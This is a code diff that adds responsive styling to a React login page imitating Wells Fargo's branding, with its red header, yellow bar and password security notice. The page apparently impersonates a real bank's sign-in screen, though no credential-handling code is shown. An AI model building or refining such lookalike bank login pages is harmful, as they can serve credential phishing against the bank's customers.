@@ -150,10 +150,10 @@ export default function LoginPage() {
   return (
     <div className="min-h-screen flex flex-col bg-white">
       {/* Header */}
-      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
+      <header className="bg-[#d71e28] px-4 py-3 md:py-4 flex items-center justify-between">
         <div className="flex-1"></div>
         <h1 
-          className="text-white text-xl tracking-wide font-bold"
+          className="text-white text-xl md:text-2xl tracking-wide font-bold"
           style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
         >
           WELLS FARGO
@@ -164,18 +164,19 @@ export default function LoginPage() {
       </header>
 
       {/* Yellow accent bar */}
-      <div className="h-1.5 bg-[#ffcd41]"></div>
+      <div className="h-1.5 md:h-2 bg-[#ffcd41]"></div>
 
-      {/* Main Content */}
-      <main className="flex-1 px-5 py-8">
-        {/* Greeting */}
-        <h2 
-          className="text-3xl text-[#1a1a1a] mb-8"
-          style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
-          data-testid="text-greeting"
-        >
-          {greeting}
-        </h2>
+      {/* Main Content - Centered container for larger screens */}
+      <main className="flex-1 flex justify-center">
+        <div className="w-full max-w-md px-5 py-8 md:py-12 lg:py-16">
+          {/* Greeting - Centered */}
+          <h2 
+            className="text-3xl md:text-4xl text-[#1a1a1a] mb-8 text-center"
+            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+            data-testid="text-greeting"
+          >
+            {greeting}
+          </h2>
 
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
@@ -331,9 +332,10 @@ export default function LoginPage() {
 
         {/* Security Notice */}
         <div className="mt-8 pt-6 border-t border-gray-200">
-          <p className="text-xs text-gray-500 leading-relaxed">
+          <p className="text-xs text-gray-500 leading-relaxed text-center">
             Your security is important to us. Wells Fargo uses 128-bit Secure Sockets Layer (SSL) encryption to protect your personal information. Never share your password with anyone. Wells Fargo will never ask for your password via email, phone, or text message.
           </p>
+        </div>
         </div>
       </main>
 
